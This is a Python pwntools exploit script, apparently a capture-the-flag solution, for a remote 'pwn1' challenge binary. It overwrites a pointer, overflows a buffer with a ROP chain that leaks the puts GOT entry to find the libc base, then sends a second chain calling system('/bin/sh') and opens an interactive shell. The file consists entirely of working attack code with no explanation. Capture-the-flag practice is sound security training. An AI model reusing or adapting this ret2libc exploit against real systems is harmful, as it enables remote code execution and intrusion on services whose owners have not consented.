#coding:utf-8
from pwn import *

#p=process('./pwn1')
p=remote('redirect.do-not-trust.hacking.run',10474)
elf=ELF('./pwn1')
context.log_level='debug'

libc = ELF('./libc-2.23.so')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
pop_rdi_ret=0x0000000000400a03

p.sendlineafter('your choice','0')
p.sendlineafter('address:\n',str(0x601020))
p.sendafter('content:\n',p64(elf.plt['puts']))

p.sendlineafter('your choice\n','1')
p.sendlineafter('size:\n',str(0x500))
p.sendlineafter('content:\n','A'*0x110+'b'*8+p64(pop_rdi_ret)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x40090b))

#leak
p.sendlineafter('your choice\n','-1')
puts=u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
success('puts:'+hex(puts))
libc_base=puts-libc.sym['puts']
success('libc_base:'+hex(libc_base))

sh=libc_base+libc.search('/bin/sh').next()
system=libc_base+libc.sym['system']

p.sendlineafter('your choice','0')
p.sendlineafter('address:\n',str(0x601020))
p.sendafter('content:\n',p64(elf.plt['puts']))

p.sendlineafter('your choice\n','1')
p.sendlineafter('size:\n',str(0x500))
p.sendlineafter('content:\n','A'*0x110+'b'*8+p64(0x00000000004005d9)+p64(pop_rdi_ret)+p64(sh)+p64(system))

#get shell
p.sendlineafter('your choice\n','-1')
p.interactive()